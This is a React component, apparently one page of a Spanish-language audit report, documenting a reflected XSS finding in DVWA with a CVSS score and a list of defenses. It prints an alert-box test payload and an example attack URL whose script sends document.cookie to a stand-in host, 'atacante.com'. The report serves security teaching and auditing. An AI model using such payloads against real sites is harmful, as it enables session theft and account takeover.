import xssImg from "../img_johnic/xss_johnic.png";

export default function XSS() {
  return (
    <div>
      <div className="section-header">
        <span className="section-eyebrow">03 — VULNERABILIDAD</span>
        <h2 className="section-title">XSS Reflected</h2>
        <p className="section-desc">Inyección de código JavaScript arbitrario que el servidor refleja sin sanitizar en la respuesta HTML.</p>
      </div>

      <div className="card">
        <p className="card-title">Evidencia</p>
        <table className="audit-table" style={{marginBottom:"16px"}}>
          <tbody>
            <tr><td style={{color:"var(--text-dim)",width:"160px"}}>Módulo DVWA</td><td>XSS (Reflected)</td></tr>
            <tr><td style={{color:"var(--text-dim)"}}>Nivel</td><td>Low</td></tr>
            <tr><td style={{color:"var(--text-dim)"}}>Payload</td><td><code className="code-block" style={{display:"inline",padding:"2px 8px"}}>{"<script>alert('Johnen')</script>"}</code></td></tr>
            <tr><td style={{color:"var(--text-dim)"}}>Resultado</td><td>El script fue reflejado directamente en el HTML y ejecutado por el navegador, mostrando una ventana de alerta con el texto "johnen".</td></tr>
          </tbody>
        </table>
        <div className="screenshot-wrap">
          <div className="screenshot-label">xss_johnic.png — XSS Reflected resultado</div>
          <img src={xssImg} alt="Evidencia XSS Reflected" />
        </div>
      </div>

      <div className="card">
        <p className="card-title">¿Por qué ocurre?</p>
        <p style={{fontSize:"13px",marginBottom:"12px"}}>La aplicación toma el input del usuario y lo inserta directamente en el HTML de la respuesta sin escapar caracteres especiales. El navegador interpreta el contenido como código válido y lo ejecuta. En un escenario real, un atacante podría distribuir:</p>
        <div className="code-block">{"https://portal.notaria.cl/xss_r?name=<script>document.location='https://atacante.com/steal?c='+document.cookie</script>"}</div>
        <p style={{fontSize:"13px",marginTop:"12px"}}>Logrando robar cookies de sesión, redirigir al usuario a sitios falsos o capturar credenciales.</p>
      </div>

      <div className="grid-2">
        <div className="card">
          <p className="card-title">CVSS v3.1</p>
          <div className="cvss-score">
            <span className="cvss-number" style={{color:"#ff8c00",textShadow:"0 0 20px #ff8c00"}}>6.1</span>
            <div className="cvss-label">
              <span className="cvss-level" style={{color:"#ff8c00"}}>MEDIO</span>
              <span className="cvss-vector">AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span>
            </div>
          </div>
          <table className="audit-table" style={{marginTop:"12px"}}>
            <tbody>
              <tr><td style={{color:"var(--text-dim)"}}>Vector de Ataque</td><td>Red (Network)</td></tr>
              <tr><td style={{color:"var(--text-dim)"}}>Complejidad</td><td>Baja</td></tr>
              <tr><td style={{color:"var(--text-dim)"}}>Privilegios</td><td>Ninguno</td></tr>
              <tr><td style={{color:"var(--text-dim)"}}>Interacción Usuario</td><td>Requerida</td></tr>
              <tr><td style={{color:"var(--text-dim)"}}>Alcance</td><td>Cambia (Changed)</td></tr>
              <tr><td style={{color:"var(--text-dim)"}}>Confidencialidad</td><td><span className="badge badge--medium">BAJO</span></td></tr>
              <tr><td style={{color:"var(--text-dim)"}}>Integridad</td><td><span className="badge badge--medium">BAJO</span></td></tr>
              <tr><td style={{color:"var(--text-dim)"}}>Disponibilidad</td><td><span className="badge badge--low">NINGUNA</span></td></tr>
            </tbody>
          </table>
        </div>

        <div className="card">
          <p className="card-title">Defensa</p>
          <table className="audit-table">
            <tbody>
              <tr><td style={{color:"var(--red-soft)",fontFamily:"var(--mono)",fontSize:"11px"}}>Output Encoding</td><td style={{fontSize:"12px"}}>Convertir caracteres como &lt; &gt; " en entidades HTML antes de insertarlos en la respuesta.</td></tr>
              <tr><td style={{color:"var(--red-soft)",fontFamily:"var(--mono)",fontSize:"11px"}}>CSP</td><td style={{fontSize:"12px"}}>Cabeceras HTTP que restrinjan qué scripts pueden ejecutarse en el navegador.</td></tr>
              <tr><td style={{color:"var(--red-soft)",fontFamily:"var(--mono)",fontSize:"11px"}}>Validación de inputs</td><td style={{fontSize:"12px"}}>Rechazar entradas con etiquetas HTML o atributos de eventos como onerror, onload.</td></tr>
              <tr><td style={{color:"var(--red-soft)",fontFamily:"var(--mono)",fontSize:"11px"}}>HttpOnly en cookies</td><td style={{fontSize:"12px"}}>Marcar cookies con HttpOnly para impedir su acceso desde JavaScript.</td></tr>
              <tr><td style={{color:"var(--red-soft)",fontFamily:"var(--mono)",fontSize:"11px"}}>Frameworks seguros</td><td style={{fontSize:"12px"}}>Usar React, Angular o Vue que escapen el contenido por defecto.</td></tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}